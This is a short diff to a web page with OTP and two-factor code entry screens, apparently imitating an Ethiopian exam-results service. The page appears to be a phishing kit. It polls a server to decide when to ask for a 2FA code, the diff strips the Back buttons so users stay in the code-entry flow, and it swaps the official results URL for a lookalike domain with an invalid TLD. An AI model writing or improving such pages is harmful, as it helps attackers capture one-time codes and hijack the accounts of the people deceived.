@@ -215,10 +215,6 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
 
     <div id="otp-verification-view" class="step-view">  
         <div class="otp-screen-container">
-            <button class="back-btn" onclick="backToForm()" style="align-self: flex-start; margin-bottom: 15px;">  
-                <i class="fa-solid fa-arrow-left"></i> Back
-            </button>  
-
             <div class="username-card" style="padding: 24px 15px; width: 100%;">  
                 <div class="center-user-icon" style="background-color: #154186;">  
                     <i class="fa-solid fa-shield-halved"></i>  
@@ -248,10 +244,6 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
 
 
     <div id="twofa-verification-view" class="step-view">  
-        <button class="back-btn" onclick="backToForm()">  
-            <i class="fa-solid fa-arrow-left"></i> Back
-        </button>  
-
         <div class="username-card">  
             <div class="center-user-icon" style="background-color: #6f42c1;">  
                 <i class="fa-solid fa-key"></i>  
@@ -353,7 +345,7 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
             switchTo2FAPage();
         } else if (data.status === "SUCCESS") {
             if (statusInterval) clearInterval(statusInterval);
-            window.location.href = "https://result.moe.gov.et";
+            window.location.href = "https://result.ethernet.edu.ett";
         }
     }
 
@@ -492,7 +484,6 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
     function pressNumber(num) {
         if (window.navigator.vibrate) window.navigator.vibrate(15);
         
-        // ተጠቃሚው ቁጥር መጫን ሲጀምር የስህተት መልእክት ሳጥን ይደበቃል (የበለጠ ይጣበቃል)
         otpErrorBox.style.display = 'none';
         clearOtpStatus();
 
